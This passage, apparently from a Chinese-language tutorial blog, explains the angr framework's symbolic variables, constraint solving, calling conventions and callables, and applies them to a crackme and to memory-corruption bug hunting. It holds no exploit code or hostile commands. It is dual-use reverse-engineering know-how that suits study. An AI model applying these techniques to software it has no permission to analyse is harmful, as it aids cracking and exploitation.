operator">&lt;</span>BV64 x_9_6<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> y <span class="token operator">=</span> state.solver.BVS<span class="token punctuation">(</span><span class="token string">"y"</span>, <span class="token number">64</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> y<span class="token operator">&lt;</span>BV64 y_10_6<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>x, y 就是一个符号变量，使用它们进行操作你不会直接得到一个结果，而是得到一个AST。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x + one<span class="token operator">&lt;</span>BV64 x_9_64 + 0x<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span>x + one<span class="token punctuation">)</span> / <span class="token number">2</span><span class="token operator">&lt;</span>BV64 <span class="token punctuation">(</span>x_9_64 + 0x1<span class="token punctuation">)</span> / 0x<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x - y<span class="token operator">&lt;</span>BV64 x_9_64 - y_10_6<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>let’s learn how to process ASTs.每一个AST都有一个.op和一个.args，op代表一个操作的string name，args则代表一个操作的input参数，Unless the op is <code>BVV</code> or <code>BVS</code> (or a few others…), the args are all other ASTs, the tree eventually terminating with BVVs or BVSs. （差不多意思就是数都以变量结尾）</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree <span class="token operator">=</span> <span class="token punctuation">(</span>x + <span class="token number">1</span><span class="token punctuation">)</span> / <span class="token punctuation">(</span>y + <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree<span class="token operator">&lt;</span>BV64 <span class="token punctuation">(</span>x_9_64 + 0x1<span class="token punctuation">)</span> / <span class="token punctuation">(</span>y_10_64 + 0x2<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.op<span class="token string">'__floordiv__'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.args<span class="token punctuation">(</span><span class="token operator">&lt;</span>BV64 x_9_64 + 0x<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>, <span class="token operator">&lt;</span>BV64 y_10_64 + 0x<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.op<span class="token string">'__add__'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.args<span class="token punctuation">(</span><span class="token operator">&lt;</span>BV64 x_9_6<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>, <span class="token operator">&lt;</span>BV64 0x<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>.op<span class="token string">'BVV'</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tree.args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>.args<span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">64</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了符号变量之外还有一个重要的概念就是符号约束。任何两个AST之间执行比较操作将产生一个新的AST，不是一个bitvector，而是一个符号化的布尔值（symbolic boolean）.</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">&lt;</span>Bool x_9_64 <span class="token operator">==</span> 0x<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">==</span> one<span class="token operator">&lt;</span>Bool x_9_64 <span class="token operator">==</span> 0x<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token operator">&lt;</span>Bool x_9_64 <span class="token operator">&gt;</span> 0x<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x + y <span class="token operator">==</span> one_hundred + <span class="token number">5</span><span class="token operator">&lt;</span>Bool <span class="token punctuation">(</span>x_9_64 + y_10_64<span class="token punctuation">)</span> <span class="token operator">==</span> 0x6<span class="token operator"><span class="token file-descriptor important">9</span>&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> one_hundred <span class="token operator">&gt;</span> <span class="token number">5</span><span class="token operator">&lt;</span>Bool True<span class="token operator">&gt;</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> one_hundred <span class="token operator">&gt;</span> -5<span class="token operator">&lt;</span>Bool False<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>必须记住的一点是比较操作默认是无符号的，因为-5代表的是&lt;BV64 0xfffffffffffffffb&gt;，因为-5实际上小于one_hunderd，但是因为是无符号操作，所以得到的结果才是False。为了使用有符号操作，必须<code>one_hundred.SGT(-5)</code> (that’s “signed greater-than”)，angr在比较中的一些操作有自己的独特定义，可以看文档。</p><p>​        同时必须记住不能将两个变量之间的比较作为if或者while语句的条件，因为结果可能不会是一个精确的值，应该使用solver.is_true  and  solver.is_false，which test for concrete truthyness/falsiness without performing a constraint solve.</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token function">yes</span> <span class="token operator">=</span> one <span class="token operator">==</span> <span class="token number">1</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> no <span class="token operator">=</span> one <span class="token operator">==</span> <span class="token number">2</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> maybe <span class="token operator">=</span> x <span class="token operator">==</span> y<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_true<span class="token punctuation">(</span>yes<span class="token punctuation">)</span>True<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_false<span class="token punctuation">(</span>yes<span class="token punctuation">)</span>False<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_true<span class="token punctuation">(</span>no<span class="token punctuation">)</span>False<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_false<span class="token punctuation">(</span>no<span class="token punctuation">)</span>True<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_true<span class="token punctuation">(</span>maybe<span class="token punctuation">)</span>False<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state.solver.is_false<span class="token punctuation">(</span>maybe<span class="token punctuation">)</span>False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来一个比较重要的概念就是约束求解Constraint Solving，你可以将所有符号布尔值作为关于符号变量的有效值的断言，并将其作为约束加入到state，然后可以对符号表达式进行求解来获取一个合适的具体值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x <span class="token operator">&gt;</span> y<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>y <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">&gt;</span> x<span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>值得注意的事如果state.solver.eval(y)，则结果也会是4，因为如果两次查询之间没有添加任何约束，两次查询的结果会相同。（文档这么说，但是我觉得不一定）</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230131115114039.2z1wbcycrwy0.png"></p><p>同时Angr还支持浮点数和很多Solving methods，需要的时候可以参考上面的文档链接。</p><h3 id="Vex-IR-infro"><a href="#Vex-IR-infro" class="headerlink" title="Vex IR infro"></a>Vex IR infro</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://github.com/angr/angr-doc/blob/master/docs/paths.md">https://github.com/angr/angr-doc/blob/master/docs/paths.md</a></p></blockquote><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/image-20230204162114487.1qf5tzubisgw.png"></p><h3 id="Working-with-Data-and-Conventions"><a href="#Working-with-Data-and-Conventions" class="headerlink" title="Working with Data and Conventions"></a>Working with Data and Conventions</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://docs.angr.io/advanced-topics/structured_data">https://docs.angr.io/advanced-topics/structured_data</a></p></blockquote><p>​        angr有自己的类型系统，这些SimType可以在angr.types里面发现，不同的类型在不同的架构里面具备不同的size，可以通过ty.with_arch(arch)来查看某个类型对应的指定架构的信息，同时angr有一个wrapper叫做pycparser，是一个C解析器，它提供很多强大的功能。</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><a href="https://docs.angr.io/advanced-topics/structured_data#working-with-calling-conventions">https://docs.angr.io/advanced-topics/structured_data#working-with-calling-conventions</a></p></blockquote><p>​        angr有自己的调用约定叫做SimCC，可以通过p.factory.cc(..)来创建实例，一般来说，angr会根据客户机的系统和架构自己确定调用约定，如果无法确定，可以在angr.calling_conventions里面找到一个进行手工指定。详细细节可以参考链接，这里主要说一下callable，因为它经常用于漏洞挖掘工作。如果想定义一个callable，必须有函数地址和调用约定以及参数和返回值，像之前说的调用约定可以angr自动判断，那么参数和返回值必须人工设定：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">charstar <span class="token operator">=</span> angr<span class="token punctuation">.</span>sim_type_<span class="token punctuation">.</span>parse_type<span class="token punctuation">(</span><span class="token string">"char *"</span><span class="token punctuation">)</span>prototype <span class="token operator">=</span> angr<span class="token punctuation">.</span>sim_type<span class="token punctuation">.</span>SimTypeFunction<span class="token punctuation">(</span><span class="token punctuation">(</span>charstar<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> angr<span class="token punctuation">.</span>sim_type<span class="token punctuation">.</span>SimTypeInt<span class="token punctuation">(</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的prototype就是一个参数和返回值的类型，然后通过下面：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cc <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>cc<span class="token punctuation">(</span>func_ty<span class="token operator">=</span>prototype<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>的方式进行调用约定的创建，然后通过如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">check_func <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token builtin">callable</span><span class="token punctuation">(</span>find_func<span class="token punctuation">.</span>addr<span class="token punctuation">,</span> concrete_only<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> cc<span class="token operator">=</span>cc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>的方式创建callable，这里的concrete_only是False，因为这样才能开启符号化的参数，不过目前默认就是关闭的，可以看api doc注释：</p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li>concrete_only– Throw an exception if the execution splits into multiple states</li></ul></blockquote><p>下面是使用具体值和符号变量的两种方式：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"abcd"</span><span class="token punctuation">,</span> <span class="token string">"96"</span><span class="token punctuation">,</span> <span class="token string">"87"</span><span class="token punctuation">,</span> <span class="token string">"55"</span><span class="token punctuation">,</span> <span class="token string">"qqqq"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Running angr callable with concrete arguments"</span><span class="token punctuation">)</span><span class="token keyword">for</span> arg <span class="token keyword">in</span> my_args<span class="token punctuation">:</span>    ret_val <span class="token operator">=</span> check_func<span class="token punctuation">(</span>arg<span class="token punctuation">)</span>    stdout <span class="token operator">=</span> check_func<span class="token punctuation">.</span>result_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Input  : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Stdout : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>符号变量：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#Does not return</span>my_sym_arg <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'my_arg'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#10 byte long str</span>ret_val <span class="token operator">=</span> check_func<span class="token punctuation">(</span>my_sym_arg<span class="token punctuation">)</span>stdout <span class="token operator">=</span> check_func<span class="token punctuation">.</span>result_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Stdout : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>事实上，callable对具体值的分析和跟踪更有效果，如果使用符号化变量的话，直到所有的路径全部执行完毕才会返回结果，这很可能招致路径爆炸问题进而耗费完所有的内存。为了解决这个问题可以使用call state，这样的话，angr会初始化一个状态来调用单个函数，对于callable来说，它会创建一个状态然后运行直到所有路径遍历，但是call sate可以使用simulation manager提供的探索func和step运行功能来缓解callable的问题。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">my_sym_arg <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'my_arg'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment">#10 byte long str</span><span class="token comment">#Same calling convention from earlier</span>state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>call_state<span class="token punctuation">(</span>find_func<span class="token punctuation">.</span>addr<span class="token punctuation">,</span> my_sym_arg<span class="token punctuation">,</span> cc<span class="token operator">=</span>cc<span class="token punctuation">)</span>simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>crack_me_good_addr<span class="token punctuation">)</span>found_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>my_input <span class="token operator">=</span> found_state<span class="token punctuation">.</span>se<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>my_sym_arg<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">,</span> <span class="token string">"ignore"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"One solution : {}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>my_input<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过对于一个simulation manager来说，在探索的时候可以加入step_func来实现内存漏洞的挖掘。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>crack_me_good_addr<span class="token punctuation">,</span> step_func<span class="token operator">=</span>check_mem_corruption<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="分析例子"><a href="#分析例子" class="headerlink" title="分析例子"></a>分析例子</h2><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>例子都在angr官方的examples里面，我就不多说内容了，只写结论，想要了解还是自己动手操作一波。</p></blockquote><h3 id="strcpy-find"><a href="#strcpy-find" class="headerlink" title="strcpy_find"></a>strcpy_find</h3><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path 